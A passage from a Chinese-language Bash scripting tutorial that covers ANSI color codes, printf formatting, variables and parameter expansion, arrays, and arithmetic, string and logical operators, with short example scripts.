Text\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>背景色代码</td><td>40</td><td>黑色背景</td><td>\e[40;37mBlack BG\e[0m</td></tr><tr><td/><td>41</td><td>红色背景</td><td>\e[41;37mRed BG\e[0m</td></tr><tr><td/><td>42</td><td>绿色背景</td><td>\e[42;30mGreen BG\e[0m</td></tr><tr><td/><td>43</td><td>黄色背景</td><td>\e[43;30mYellow BG\e[0m</td></tr><tr><td/><td>44</td><td>蓝色背景</td><td>\e[44;37mBlue BG\e[0m</td></tr><tr><td/><td>45</td><td>紫色背景</td><td>\e[45;37mMagenta BG\e[0m</td></tr><tr><td/><td>46</td><td>青色背景</td><td>\e[46;30mCyan BG\e[0m</td></tr><tr><td/><td>47</td><td>白色背景</td><td>\e[47;30mWhite BG\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>扩展功能</td><td>38;2;r;g;b</td><td>自定义前景色（RGB，r/g/b为0-255）</td><td>\e[38;2;255;0;0mCustom Red\e[0m</td></tr><tr><td/><td>48;2;r;g;b</td><td>自定义背景色（RGB，r/g/b为0-255）</td><td>\e[48;2;0;0;255;37mCustom Blue BG\e[0m</td></tr><tr><td/><td>5m</td><td>闪烁（与样式代码 5 相同）</td><td>\e[31;5mFlashing Red\e[0m</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[1;4;5;31;47m紧急状态\e[0m"</span> <span class="hljs-comment"># 输出闪烁的 带有下划线的 白色背景的 红色文字</span>
</code></pre>
<h4 data-id="heading-14">printf</h4>
<p>printf 是 Shell 中用于格式化输出的命令。与 echo 不同，printf 来源于 C 语言标准库，遵循 <strong>POSIX 标准</strong>，因此它具有更好的<strong>跨平台兼容性</strong>（不会因为 OS 不同而导致行为诡异）和更强大的<strong>文本排版能力</strong></p>
<p>其特点主要有：</p>
<ul>
<li><strong>不自动换行</strong>：printf 不会在结尾默认添加<code>\n</code>，你需要显式地在<code>FORMAT</code>字符串中控制换行</li>
<li><strong>格式与参数分离</strong>：前面是“模版”，后面是“数据”</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">printf</span> FORMAT [ARGUMENT]...
</code></pre>
<p>常见格式替换符</p>



































<table><thead><tr><th>占位符</th><th>含义</th><th>备注</th></tr></thead><tbody><tr><td><strong>%s</strong></td><td><strong>字符串</strong> (String)</td><td>最常用</td></tr><tr><td><strong>%d</strong></td><td><strong>十进制整数</strong> (Decimal)</td><td>如果参数是小数会被截断，是非数字字符则报错或显示为0</td></tr><tr><td><strong>%f</strong></td><td><strong>浮点数</strong> (Float)</td><td>默认保留6位小数，可通过 %.2f 控制精度</td></tr><tr><td>%b</td><td>转义字符串</td><td>会解析参数中的转义序列（如 \n, \t）</td></tr><tr><td>%x</td><td>十六进制数</td><td>常用于数值转换</td></tr></tbody></table>
<p>常见转义字符</p>



































<table><thead><tr><th>序列</th><th>含义</th><th>场景</th></tr></thead><tbody><tr><td><strong>\n</strong></td><td><strong>换行</strong></td><td>几乎每条指令末尾都必须加</td></tr><tr><td><strong>\t</strong></td><td><strong>水平制表符 (Tab)</strong></td><td>用于简易的列对齐</td></tr><tr><td>\</td><td>反斜杠本身</td><td>输出路径时常用</td></tr><tr><td>\r</td><td>回车 (CR)</td><td>光标回到行首（常用于覆盖当前行实现简易进度条）</td></tr><tr><td>\0ddd</td><td>八进制字节</td><td>输出特殊 ASCII 字符</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 单引号</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">'%d %s\n'</span> 1 <span class="hljs-string">"abc"</span>
<span class="hljs-comment">#  Output:1 abc</span>

<span class="hljs-comment"># 双引号</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%d %s\n"</span> 1 <span class="hljs-string">"abc"</span>
<span class="hljs-comment">#  Output:1 abc</span>

<span class="hljs-comment"># 无引号</span>
<span class="hljs-built_in">printf</span> %s abcdef
<span class="hljs-comment">#  Output: abcdef(并不会换行)</span>

<span class="hljs-comment"># 格式只指定了一个参数，但多出的参数仍然会按照该格式输出</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s\n"</span> abc def
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  abc</span>
<span class="hljs-comment">#  def</span>

<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s %s %s\n"</span> a b c d e f g h i j
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  a b c</span>
<span class="hljs-comment">#  d e f</span>
<span class="hljs-comment">#  g h i</span>
<span class="hljs-comment">#  j</span>

<span class="hljs-comment"># 如果没有参数，那么 %s 用 NULL 代替，%d 用 0 代替</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s and %d \n"</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#   and 0</span>

<span class="hljs-comment"># 格式化输出</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4s\n"</span> 姓名 性别 体重kg
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> 郭靖 男 66.1234
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> 杨过 男 48.6543
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> 郭芙 女 47.9876
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  姓名     性别   体重kg</span>
<span class="hljs-comment">#  郭靖     男      66.12</span>
<span class="hljs-comment">#  杨过     男      48.65</span>
<span class="hljs-comment">#  郭芙     女      47.99</span>
</code></pre>
<blockquote>
<p>日常简单输出用<code>echo</code>即可；但在需要严格控制对齐（如打印表格）或处理特殊格式时，<code>printf</code>是不可替代的神器</p>
</blockquote>
<h3 data-id="heading-15">变量</h3>
<p>Bash 中没有数据类型，变量可以保存一个数字、一个字符、一个字符串等。同时无需提前声明变量，给变量赋值会直接创建变量</p>
<ul>
<li>只能使用英文字母，数字和下划线，且不能以数字开头</li>
<li><strong>变量名和等号之间不能有空格</strong>（<code>name = value</code>是错的）</li>
<li>不能使用 bash 里的关键字（help 命令查看保留关键字）</li>
<li>可以使用驼峰（personOfName）或者现代式（person_of_name）</li>
</ul>
<p>访问变量的语法形式为：<code>${var}</code>和<code>$var</code>。花括号是为了帮助解释器识别变量的边界，推荐使用<code>${var}</code></p>
<pre><code class="hljs language-bash" lang="bash">word=<span class="hljs-string">"hello"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${word}</span> <span class="hljs-comment"># hello</span>
</code></pre>
<p>变量赋值方法有很多，以下为常用的赋值方式：</p>

























<table><thead><tr><th>赋值方法</th><th>格式</th></tr></thead><tbody><tr><td>直接赋值</td><td>name=zhangsan</td></tr><tr><td>命令结果赋值</td><td>path=`pwd`</td></tr><tr><td>脚本传参</td><td>user_name=$1</td></tr><tr><td>read交互式赋值（不常用）</td><td><code>-p</code>：交互时提示信息<br/><code>-t</code>：超过时间没操作则自动退出<br/><code>-s</code>：不显示用户的输入</td></tr></tbody></table>
<h4 data-id="heading-16">变量类型</h4>
<ul>
<li><strong>局部变量</strong>：在当前 Shell 进程或脚本中定义的变量，仅在当前进程有效。不会被子 Shell 或子脚本继承</li>
<li><strong>环境变量</strong>： export 导出的变量，在当前进程及其产生的所有子进程中有效</li>
<li><strong>Shell特殊变量</strong>：由 Shell 程序（如 bash）启动时自动设置的只读或读写变量，用于维持 Shell 的运行</li>
</ul>
<h5 data-id="heading-17">环境变量</h5>
<p>常见的环境变量：</p>

























































<table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>$HOME</code></td><td>当前用户的用户目录</td></tr><tr><td><code>$LANG</code></td><td>系统语言与字符集</td></tr><tr><td><code>$PATH</code></td><td>记录<strong>命令位置</strong>的环境变量，运行命令的时候bash会在PATH的路径中查找</td></tr><tr><td><code>$PWD</code></td><td>当前工作目录</td></tr><tr><td><code>$UID</code></td><td>数值类型，当前用户的用户 ID</td></tr><tr><td><code>$PS1</code></td><td>命令行的主提示符，用户在终端输入命令时看到的默认提示符</td></tr><tr><td><code>$PS2</code></td><td>辅助提示符，用于多行命令输入时的提示</td></tr><tr><td>$RANDOM</td><td>0~32767之间的整数</td></tr><tr><td>$HISTSIZE</td><td>history 命令记录命令上限</td></tr><tr><td>$HISTFILESIZE</td><td>history 历史记录文件的大小</td></tr><tr><td>$HISTCONTROL</td><td>控制历史命令记录或不记录哪些内容</td></tr><tr><td>$HISTFILE</td><td>指定历史命令的记录文件</td></tr></tbody></table>
<blockquote>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ftldp.org%2FLDP%2FBash-Beginners-Guide%2Fhtml%2Fsect_03_02.html%23%23%23sect_03_02_04" target="_blank" title="http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html###sect_03_02_04" ref="nofollow noopener noreferrer">这里</a> 有一张更全面的 Bash 环境变量列表</p>
</blockquote>
<p>在 Shell 中，与环境变量相关的常用关键字及命令如下</p>






























<table><thead><tr><th>关键字</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td>export</td><td>将变量导出为环境变量，使其对子进程可见</td><td>export VAR=val</td></tr><tr><td>env</td><td>查看当前所有的环境变量</td><td>env</td></tr><tr><td>set</td><td>显示当前Shell的所有变量（环境变量、局部变量、 Shell 函数）</td><td>set | grep VAR</td></tr><tr><td>unset</td><td>删除变量（包括环境变量），但仅影响当前Shell及子进程</td><td>unset VAR</td></tr></tbody></table>
<h5 data-id="heading-18">特殊变量</h5>
<p><strong>变量名只能包含数字、字母和下划线</strong>，因为某些包含其他字符的变量有特殊含义，这样的变量被称为<strong>特殊变量</strong></p>
<h6 data-id="heading-19">位置变量</h6>





























<table><thead><tr><th>位置变量</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>当前脚本的文件名</td></tr><tr><td><code>$n</code></td><td>传递给脚本或函数的参数。n 为数字，表示第几个参数。例如，第一个参数是<code>$1</code>，第二个参数是<code>$2</code><br/>当<code>n&gt;9</code>时，需要加上<code>{}</code>，避免产生歧义</td></tr><tr><td><code>$#</code></td><td>传递给脚本或函数的参数个数</td></tr><tr><td><code>$*</code></td><td>传递给脚本或函数的所有参数</td></tr><tr><td><code>$@</code></td><td>传递给脚本或函数的所有参数。被双引号包含时，与<code>$*</code>不同</td></tr></tbody></table>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">!/bin/bash</span>
echo "File Name: $0"
echo "First Parameter : $1"
echo "Second Parameter : $2"
echo "Quoted Values: $@"
echo "Quoted Values: $*"
echo "Total Number of Parameters : $#"
<span class="hljs-meta prompt_">
# </span><span class="bash">output</span>
<span class="hljs-meta prompt_"># </span><span class="bash">./test.sh Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">File Name : ./test.sh</span>
<span class="hljs-meta prompt_"># </span><span class="bash">First Parameter : Hello</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Second Parameter : World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Quoted Values: Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Quoted Values: Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Total Number of Parameters : 2</span>
</code></pre>
<blockquote>
<p><code>$*</code>和<code>$@</code>的区别：</p>
<p>1）不被双引号包含时，都以<code>"$1" "$2" … "$n"</code>的形式输出所有参数</p>
<p>2）被双引号包含时</p>
<ul>
<li><code>"$*"</code>：将所有参数压缩为一个字符串 -&gt; <code>"$1 $2 … $n"</code></li>
<li><code>"$@"</code>：将每个参数保留为独立的字符串 -&gt; <code>"$1" "$2" … "$n"</code></li>
</ul>
<p>在编写循环处理参数的脚本时（比如遍历输入的文件列表），<strong>永远使用 "$@"</strong>，除非你非常确定你在做什么</p>
</blockquote>
<h6 data-id="heading-20">状态变量</h6>

























<table><thead><tr><th>状态变量</th><th>含义</th></tr></thead><tbody><tr><td><code>$?</code></td><td>上个命令的退出状态，或函数的返回值，非0为异常</td></tr><tr><td><code>$$</code></td><td>当前Shell进程ID。对于 Shell 脚本，就是这些脚本所在的进程ID</td></tr><tr><td><code>$!</code></td><td>上一个脚本/命令（持续运行）的PID</td></tr><tr><td><code>$_</code></td><td>上一个命令的最后一个参数</td></tr></tbody></table>
<p>退出状态指上一个命令执行后的返回结果，为一个数字。大部分命令执行成功会返回 0，失败返回 1，也有一些命令返回其他值，表示不同类型的错误</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [[ $? != 0 ]];<span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"error"</span>
  <span class="hljs-built_in">exit</span> 1;
<span class="hljs-keyword">fi</span>
</code></pre>
<h6 data-id="heading-21">变量子串</h6>
<p><strong>变量子串</strong> 是指从一个变量的值中提取出一部分子字符串的操作，主要通过**参数扩展（Parameter Expansion）**实现</p>













































<table><thead><tr><th>变量子串</th><th>含义</th></tr></thead><tbody><tr><td>${#param}</td><td>统计字符长度</td></tr><tr><td>${param#word}</td><td>删除最短匹配前缀</td></tr><tr><td>${param##word}</td><td>删除最长匹配前缀</td></tr><tr><td>${param%word}</td><td>删除最短匹配后缀</td></tr><tr><td>${param%%word}</td><td>删除最长匹配后缀</td></tr><tr><td>${param:offset}</td><td>截取字符串（offset从0开始计算）</td></tr><tr><td>${param:offset:length}</td><td>截取字符串（offset从0开始计算）</td></tr><tr><td>${param/pattern/replacement}</td><td>替换第一个匹配项</td></tr><tr><td>${param//pattern/replacement}</td><td>替换所有匹配项</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">param1=<span class="hljs-string">"example.txt"</span>
param2=<span class="hljs-string">"/usr/local/bin/zabbix_agentd"</span>
param3=<span class="hljs-string">"archive.tar.gz"</span>
param4=<span class="hljs-string">"archive.tar.gz"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param1#*.}</span>      <span class="hljs-comment"># 输出 "txt"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param2##*/}</span>     <span class="hljs-comment"># 输出 "zabbix_agentd"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param3%.*}</span>      <span class="hljs-comment"># 输出 "archive.tar"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param4%%.*}</span>     <span class="hljs-comment"># 输出 "archive"</span>

str=<span class="hljs-string">"apple banana apple"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${str/apple/orange}</span>   <span class="hljs-comment"># 输出 "orange banana apple"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${str//apple/orange}</span>  <span class="hljs-comment"># 输出 "orange banana orange"</span>
</code></pre>
<blockquote>
<p><code>basename</code>等价于<code>${dir##*/}</code>，<code>dirname</code>等价于<code>${dir%/*}</code></p>
</blockquote>
<h4 data-id="heading-22">变量扩展</h4>
<p>可以通过参数扩展（Parameter Expansion）为变量设置默认值</p>

























<table><thead><tr><th>变量扩展</th><th>含义</th></tr></thead><tbody><tr><td>${variable:-default}</td><td>如果变量未定义或为空，则使用默认值（不改变变量实际值）</td></tr><tr><td>${variable:=default}</td><td>如果变量未定义或为空，则将默认值赋值给变量</td></tr><tr><td>${variable:+alternate}</td><td>如果变量已定义且非空，则使用替代值（不改变变量实际值）</td></tr><tr><td>${variable:?message}</td><td>如果变量未定义或为空，则显示错误消息并退出脚本</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 情况 1：变量未定义</span>
<span class="hljs-built_in">unset</span> username
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:-"guest"}</span>"</span>   <span class="hljs-comment"># 输出 "Username: guest"</span>

<span class="hljs-comment"># 情况 2：变量为空</span>
username=<span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:="default_user"}</span>"</span>   <span class="hljs-comment"># 输出 "Username: default_user"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"After assignment: <span class="hljs-variable">$username</span>"</span>             <span class="hljs-comment"># 输出 "After assignment: default_user"</span>

<span class="hljs-comment"># 情况 3：变量已定义</span>
username=<span class="hljs-string">"admin"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:+"User exists"}</span>"</span>    <span class="hljs-comment"># 输出 "Username: User exists"</span>

<span class="hljs-comment"># 情况 4：强制检查变量是否已设置</span>
<span class="hljs-built_in">unset</span> password
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${password:?"Password is required"}</span>       <span class="hljs-comment"># 输出错误并退出脚本</span>
</code></pre>
<h3 data-id="heading-23">数组</h3>
<p>Bash 仅支持<strong>一维数组</strong>，但其设计灵活：数组的大小没有限制，且下标是不连续的（稀疏数组）。数组下标从 0 开始</p>
<p>Bash 数组用括号 () 来表示，元素之间用<strong>空格</strong>（非逗号）分隔</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 常规初始化（自动索引 0, 1, 2...）</span>
colors=(red yellow <span class="hljs-string">"dark blue"</span>) 

<span class="hljs-comment"># 显式指定索引（稀疏数组，不连续）</span>
<span class="hljs-comment"># 索引为 0, 1, 9，中间空缺</span>
nums=([0]=0 [1]=1 [9]=99)
</code></pre>
<p>访问所有元素时，可以使用<code>${arr[@]}</code>或<code>${arr[*]}</code>。在<strong>不加双引号</strong>时，两者效果相同；但在<strong>双引号</strong>包裹下，差异巨大。这是 Shell 脚本中最容易产生 Bug 的地方</p>




















<table><thead><tr><th>语法</th><th>双引号包裹时行为</th><th>逻辑模型</th></tr></thead><tbody><tr><td>"${arr[@]}"</td><td><strong>保持原状</strong>。将每个数组元素作为独立的参数传递</td><td>List&lt;String&gt;</td></tr><tr><td>"${arr[*]}"</td><td><strong>合并字符串</strong>。将所有元素合并为一个长字符串，中间以第一个 IFS 字符连接（默认是空格）</td><td>String</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">colors=(red yellow <span class="hljs-string">"dark blue"</span>)
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试：使用 printf 打印每个参数，验证参数个数</span>

<span class="hljs-comment"># ${arr[*]} 把所有东西粘在一起了</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"+ %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">${colors[*]}</span>"</span>
<span class="hljs-comment"># Output:</span>
<span class="hljs-comment"># + red yellow dark blue</span>

<span class="hljs-comment"># ${arr[@]} 完美保留了数组边界和内部空格</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"+ %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">${colors[@]}</span>"</span>
<span class="hljs-comment"># Output:</span>
<span class="hljs-comment"># + red</span>
<span class="hljs-comment"># + yellow</span>
<span class="hljs-comment"># + dark blue</span>
</code></pre>
<p><strong>数组操作速查表</strong></p>








































<table><thead><tr><th>操作类型</th><th>语法示例</th><th>说明</th></tr></thead><tbody><tr><td><strong>单元素读取</strong></td><td>${colors[1]}</td><td>读取索引为 1 的元素</td></tr><tr><td><strong>获取长度</strong></td><td>${#colors[@]}</td><td>数组元素的<strong>个数</strong>（不是最大下标）</td></tr><tr><td><strong>元素长度</strong></td><td>${#colors[0]}</td><td>获取第一个元素字符串的长度</td></tr><tr><td><strong>切片</strong></td><td>${colors[@]:0:2}</td><td>从索引 0 开始，取 2 个元素</td></tr><tr><td><strong>追加/修改</strong></td><td>colors+=(green)</td><td>+= 是最安全的追加方式；也可直接 colors[9]=black 赋值</td></tr><tr><td><strong>删除</strong></td><td>unset colors[1]</td><td><strong>注意</strong>：只置空该位置，数组索引不会重排（变稀疏了）</td></tr></tbody></table>
<h3 data-id="heading-24">运算符</h3>
<p>Shell 的运算符体系与其“容器”密不可分。学习具体操作符之前，必须先建立对<strong>计算容器</strong>的认知：</p>
<ul>
<li><code>(( ... ))</code>：专用于<strong>整数运算</strong>。支持 C 语言风格的运算符（+=, ++），无需转义</li>
<li><code>[[ ... ]]</code>：专用于<strong>条件判断</strong>。Bash 的关键字，支持正则和高级逻辑，比古老的<code>[ ... ]</code>更安全</li>
</ul>



































<table><thead><tr><th>语法</th><th>bash (#!/bin/bash)</th><th>sh (#!/bin/sh)</th><th>建议</th></tr></thead><tbody><tr><td><code>[..]</code></td><td>✅ 支持</td><td>✅ 支持</td><td><strong>兼容性首选</strong>，但要注意变量引用陷阱</td></tr><tr><td><code>[[..]]</code></td><td>✅ 支持 (更强大)</td><td>❌ <strong>不支持</strong></td><td><strong>Bash 推荐</strong>。功能多（正则、逻辑符），不需担心变量为空的问题</td></tr><tr><td><code>((..))</code></td><td>✅ 支持</td><td>❌ <strong>不支持</strong></td><td><strong>Bash 推荐</strong>。C 语言风格数字运算</td></tr><tr><td><code>$((..))</code></td><td>✅ 支持</td><td>✅ 支持</td><td><strong>通用推荐</strong>。所有 Shell 做数学运算取值的标准写法</td></tr></tbody></table>
<h4 data-id="heading-25">算术运算符</h4>
<p>Bash 原生<strong>仅支持整数运算</strong>。如需进行浮点数（小数）运算，必须借助 bc 或 awk。下表列出了常用的算术运算符</p>






























<table><thead><tr><th>符号</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>+、-、*、/、%</td><td>加减乘除、取余</td><td>注意除法 10/3 结果为 3（取整）</td></tr><tr><td>**</td><td>幂运算</td><td>2**3 等于 8</td></tr><tr><td>++、--</td><td>自增/自减</td><td>val++</td></tr><tr><td>+=</td><td>累加</td><td>count+=10</td></tr></tbody></table>
<p><strong>注意：</strong></p>
<ul>
<li><strong>表达式和运算符之间要有空格</strong>，例如<code>2+2</code>必须写成 <code>2 + 2</code></li>
<li>条件表达式要放在方括号之间，并且<strong>要有空格</strong>，例如:<code>[$x==$y]</code>必须写成 <code>[ $x == $y ]</code></li>
<li>乘号(<code>*</code>)前边必须加反斜杠(<code>\</code>)才能实现乘法运算</li>
<li>完整的表达式要被 `` 包含（反引号）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">x=10
y=3

<span class="hljs-comment"># 方式一：$(( )) (推荐 - 用于计算赋值)</span>
result=$(( x * y + <span class="hljs-number">5</span> ))  
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>

<span class="hljs-comment"># 方式二：let (推荐 - 用于纯运算)</span>
<span class="hljs-built_in">let</span> <span class="hljs-string">"x += 5"</span>  <span class="hljs-comment"># x 变为 15</span>

<span class="hljs-comment"># 方式三：(( )) (常用于循环或判断)</span>
(( x &gt; <span class="hljs-number">20</span> )) &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">"Too large"</span>
</code></pre>
<h4 data-id="heading-26">关系运算符</h4>
<p>在 Shell 中，比较<strong>数字</strong>和比较<strong>字符串</strong>使用的是两套完全不同的符号，切勿混用</p>








































<table><thead><tr><th>操作符 (通用)</th><th>含义</th><th>C 风格替代 (仅限 (()) )</th></tr></thead><tbody><tr><td>-eq</td><td>等于 (Equal)</td><td>==</td></tr><tr><td>-ne</td><td>不等于 (Not Equal)</td><td>!=</td></tr><tr><td>-gt</td><td>大于 (Greater Than)</td><td>&gt;</td></tr><tr><td>-lt</td><td>小于 (Less Than)</td><td>&lt;</td></tr><tr><td>-ge</td><td>大于等于</td><td>&gt;=</td></tr><tr><td>-le</td><td>小于等于</td><td>&lt;=</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">a=10
b=20

<span class="hljs-comment"># 场景 1：if 条件判断 (使用中括号)</span>
<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"a &lt; b"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 场景 2：C 语言风格 (使用双括号)</span>
<span class="hljs-keyword">if</span> (( a &lt; b )); <span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"a &lt; b (C-style)"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-27">字符串运算符</h4>
<p>在进行字符串比较时，变量最好<strong>总是包裹双引号</strong><code>"$var"</code>，以防变量为空导致脚本报错</p>



































<table><thead><tr><th>操作符</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>= / ==</td><td>字符串相等</td><td>[[ "$s1" == "$s2" ]]（推荐使用 ==）</td></tr><tr><td>!=</td><td>不相等</td><td>[[ "$s1" != "$s2" ]]</td></tr><tr><td>-z</td><td>Check if <strong>Zero</strong> (空)</td><td>[[ -z "$s" ]]（长度为0则真）</td></tr><tr><td>-n</td><td>Check if <strong>Non-zero</strong> (非空)</td><td>[[ -n "$s" ]]（长度不为0则真）</td></tr><tr><td><em>无符号</em></td><td>默认判非空</td><td>[[ "$s" ]] 等同于 -n</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

app_env=<span class="hljs-string">"dev"</span>
target_env=<span class="hljs-string">"prod"</span>
api_key=<span class="hljs-string">""</span>         <span class="hljs-comment"># 模拟一个空变量</span>
user_name=<span class="hljs-string">"admin"</span>

<span class="hljs-comment"># 字符串比对</span>
<span class="hljs-keyword">if</span> [[ <span class="hljs-string">"<span class="hljs-variable">$app_env</span>"</span> == <span class="hljs-string">"<span class="hljs-variable">$target_env</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"环境匹配，可以部署。"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"环境不匹配: 当前为 [<span class="hljs-variable">${app_env}</span>]，目标为 [<span class="hljs-variable">${target_env}</span>]"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 空值与非空检测，防御性编程，检查必要配置是否存在</span>
<span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">"<span class="hljs-variable">$api_key</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"[Warning] API_KEY 为空，请检查配置文件！"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 确认用户身份存在</span>
<span class="hljs-keyword">if</span> [[ -n <span class="hljs-string">"<span class="hljs-variable">$user_name</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"当前操作用户: <span class="hljs-variable">$user_name</span> (Length: <span class="hljs-variable">${#user_name}</span>)"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h4 data-id="heading-28">逻辑运算符</h4>
<p>Shell 脚本中的逻辑控制通常通过<code>[[...]]</code>或<strong>命令短路</strong>实现</p>

























<table><thead><tr><th>操作符</th><th>场景</th><th>说明</th></tr></thead><tbody><tr><td><code>!</code></td><td>非</td><td>[[ ! -e file ]]（文件不存在）</td></tr><tr><td><code>&amp;&amp;</code></td><td>逻辑与</td><td>[[ $a -gt 10 &amp;&amp; $b -lt 20 ]]（两边同时成立）</td></tr><tr><td><code>||</code></td><td>逻辑或</td><td>[[ $a -gt 10 || $b -lt 20 ]]（一边成立即可）</td></tr></tbody></table>
<p>在旧版 Old School<code>[...]</code>中，必须使用以下逻辑运算符，<strong>了解即可</strong></p>




















<table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td><code>-o</code></td><td>或运算，有一个表达式为 true 则返回 true。</td><td><code>[ $a -lt 20 -o $b -gt 100 ]</code> 返回 true</td></tr><tr><td><code>-a</code></td><td>与运算，两个表达式都为 true 才返回 true。</td><td><code>[ $a -lt 20 -a $b -gt 100 ]</code> 返回 false</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">x=10
y=20

<span class="hljs-built_in">echo</span> <span class="hljs-string">"x=<span class="hljs-variable">${x}</span>, y=<span class="hljs-variable">${y}</span>"</span>

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 ]]
<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 返回 true"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 &amp;&amp; <span class="hljs-variable">${y}</span> -gt 100 返回 false"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 ]]
<span class="hljs-keyword">then</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 返回 true"</span>
<span class="hljs-keyword">else</span>
   <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">${x}</span> -lt 100 || <span class="hljs-variable">${y}</span> -gt 100 返回 false"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  x=10, y=20</span>
<span class="hljs-comment">#  10 -lt 100 &amp;&amp; 20 -gt 100 返回 false</span>
<span class="hljs-comment">#  10 -lt 100 || 20 -gt 100 返回 true</span>
</code></pre>
<blockquote>
<p>逻辑运算符，选新不选旧，不建议使用<code>-o</code>和<code>-a</code></p>
</blockquote>
